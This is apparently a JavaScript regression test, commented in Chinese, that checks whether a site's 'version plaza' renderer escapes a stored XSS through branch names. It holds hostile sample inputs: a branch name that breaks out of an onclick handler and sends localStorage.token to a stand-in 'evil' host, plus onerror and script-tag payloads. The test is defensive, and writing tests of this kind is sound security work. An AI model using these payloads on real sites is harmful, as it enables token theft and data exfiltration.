/**
 * 版本广场（preview-branches.json）渲染 —— 存储型 XSS 回归测试
 *
 * ★ 为什么单独测这个：
 *   preview-branches.json 由 PR 的 config.json 经 CI 写入 main 分支，
 *   官网每一次打开"设置 → 版本广场"都会 fetch 它并 innerHTML 渲染。
 *   早期实现里 b.branch 没转义，还直接拼进
 *       onclick="ui.loadVersion('${b.branch}')"
 *   于是分支名里塞一个单引号就能闭合字符串、执行任意 JS。
 *
 *   桌面版跑的是同一个 ui.js，后果更重：
 *   XSS 能调 window.gdpy.readFile(path) 读本机任意文件，
 *   再通过桥把内容写进用户自己的仓库 —— 一条完整的本地数据外泄链。
 *
 * ★ 不重新实现渲染逻辑：用 vm 加载真实的 ui.js，跑真实的
 *   loadVersionPlaza / escapeHtml / escapeAttr / loadVersion。
 *   复刻一份方法体来测的话，改了源码测试照样绿，等于没测。
 */
const fs = require('fs');
const vm = require('vm');
const path = require('path');

const UI_JS = path.resolve(__dirname, '../../web/js/ui.js');

let pass = 0, fail = 0;
function ck(name, ok, extra) {
    if (ok) { pass++; console.log('  ✓ ' + name); }
    else { fail++; console.log('  ✗ ' + name + (extra ? '  → ' + extra : '')); }
}

function esc(t) {
    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

/** 造一个最小的 DOM/localStorage 环境，把 ui.js 跑起来 */
function makeCtx(branches, plazaEl) {
    const store = {};
    const ctx = {
        console,
        fetch: async () => ({ ok: true, json: async () => ({ branches }) }),
        alert: () => {},
        location: { reload: () => {} },      // loadVersion 最后会刷新页面
        localStorage: {
            getItem: k => (k in store ? store[k] : null),
            setItem: (k, v) => { store[k] = v; },
            removeItem: k => { delete store[k]; },
        },
        document: {
            createElement: () => ({
                textContent: '',
                get innerHTML() { return esc(this.textContent); },
            }),
            getElementById: id => (id === 'version-plaza' ? plazaEl : null),
        },
    };
    ctx.window = ctx;
    ctx.globalThis = ctx;
    vm.createContext(ctx);
    vm.runInContext(fs.readFileSync(UI_JS, 'utf8') + '\n;globalThis.__UI = UI;', ctx);
    return ctx;
}

/** 从渲染结果里抽出所有 data-branch 的属性值（已转义形态） */
function dataBranches(html) {
    const out = [];
    const re = /data-branch="([^"]*)"/g;
    let m;
    while ((m = re.exec(html)) !== null) out.push(m[1]);
    return out;
}

const SAFE = /^[A-Za-z0-9._\-/]+$/;

async function main() {
    console.log('【1】恶意分支名');

    const evilBranch = "preview/x');fetch('//evil?t='+localStorage.token)//";
    const plaza = { innerHTML: '', querySelectorAll: () => [] };
    const ctx = makeCtx([
        { branch: evilBranch, name: 'E', author: 'A', description: 'D', version: '1.0.0' },
        { branch: 'preview/ok/one', name: 'N', author: 'A', description: 'D', version: '1.0.0' },
    ], plaza);

    const UI = ctx.__UI;
    const inst = Object.create(UI.prototype);
    // 事件委托用的 querySelectorAll 需要能从 innerHTML 里认出节点
    plaza.querySelectorAll = sel => {
        if (sel !== '[data-branch]') return [];
        return dataBranches(plaza.innerHTML).map(v => ({
            getAttribute: k => (k === 'data-branch' ? v.replace(/&quot;/g, '"').replace(/&#39;/g, "'") : null),
            addEventListener: () => {},
        }));
    };

    await UI.prototype.loadVersionPlaza.call(inst);
    const html = plaza.innerHTML;

    ck('★ 恶意分支被白名单过滤掉',
        !html.includes(evilBranch) && !html.includes('fetch('),
        html.slice(0, 160));

    const vals = dataBranches(html);
    ck('★ 渲染出的分支名全是安全字符集',
        vals.length > 0 && vals.every(v => SAFE.test(v.replace(/&amp;/g, '&'))),
        JSON.stringify(vals));

    ck('★ 合法分支仍然渲染出来', vals.includes('preview/ok/one'));

    // 去掉被转义的文本后，不应残留任何可执行结构
    const stripped = html.replace(/&lt;[^&]*&gt;/g, '');
    ck('★ 无未转义的 <script / <img / onerror',
        !/<script/i.test(stripped) && !/<img/i.test(stripped) && !/onerror/i.test(stripped));

    console.log('\n【2】字段值里的 HTML 必须被转义');

    const plaza2 = { innerHTML: '', querySelectorAll: () => [] };
    const ctx2 = makeCtx([
        { branch: 'preview/ok/two', name: '<img src=x onerror=alert(1)>',
          author: '"><script>alert(2)</script>', description: 'd', version: '"><b>' },
    ], plaza2);
    const UI2 = ctx2.__UI;
    const inst2 = Object.create(UI2.prototype);
    await UI2.prototype.loadVersionPlaza.call(inst2);
    const h2 = plaza2.innerHTML;

    ck('★ name 里的标签被转义', !/<img/i.test(h2) && h2.includes('&lt;img'));
    ck('★ author 里的引号被转义（escapeAttr 多转引号）',
        !/<script/i.test(h2) && h2.includes('&lt;script'));
    ck('★ version 也转义了（原先是裸插值）', !/<b>/.test(h2));

    console.log('\n【3】escapeAttr 必须比 escapeHtml 更严');

    const i3 = Object.create(ctx.__UI.prototype);
    ck('  escapeHtml 不转引号（所以不能直接进属性）',
        ctx.__UI.prototype.escapeHtml.call(i3, '"x\'') === '"x\'');
    ck('  escapeAttr 转双引号', ctx.__UI.prototype.escapeAttr.call(i3, '"') === '&quot;');
    ck('  escapeAttr 转单引号', ctx.__UI.prototype.escapeAttr.call(i3, "'") === '&#39;');

    console.log('\n【4】loadVersion 入口校验');

    const i4 = Object.create(ctx.__UI.prototype);
    const before = JSON.stringify(ctx.localStorage);
    ctx.__UI.prototype.loadVersion.call(i4, evilBranch);
    ck('★ 恶意分支写不进 localStorage',
        ctx.localStorage.getItem('gd_custom_branch') === null,
        String(ctx.localStorage.getItem('gd_custom_branch')));
    ctx.__UI.prototype.loadVersion.call(i4, 'preview/ok/one');
    ck('★ 合法分支照常写入', ctx.localStorage.getItem('gd_custom_branch') === 'preview/ok/one');

    console.log('\n【5】源码级断言（防止补丁被悄悄移除）');
    const src = fs.readFileSync(UI_JS, 'utf8');
    const a = src.indexOf('async loadVersionPlaza');
    const b = src.indexOf('    loadVersion(branch)', a);
    // ★ 必须去掉注释再断言：我在注释里保留了旧漏洞的写法作为说明，
    //   不剔除的话这条断言会一直「发现」一个并不存在的内联 onclick。
    const body = src.slice(a, b).replace(/^\s*\/\/.*$/gm, '');
    ck('★ 渲染里不再有内联 onclick 调 loadVersion',
        !/onclick\s*=\s*["'][^"']*loadVersion/.test(body));
    ck('★ 仍有 data-branch 事件委托', /data-branch/.test(body) && /addEventListener/.test(body));

    console.log('\n==============================================');
    console.log('  ' + pass + ' 通过 / ' + fail + ' 失败');
    console.log('==============================================');
    process.exit(fail ? 1 : 0);
}

main().catch(e => { console.error(e); process.exit(1); });
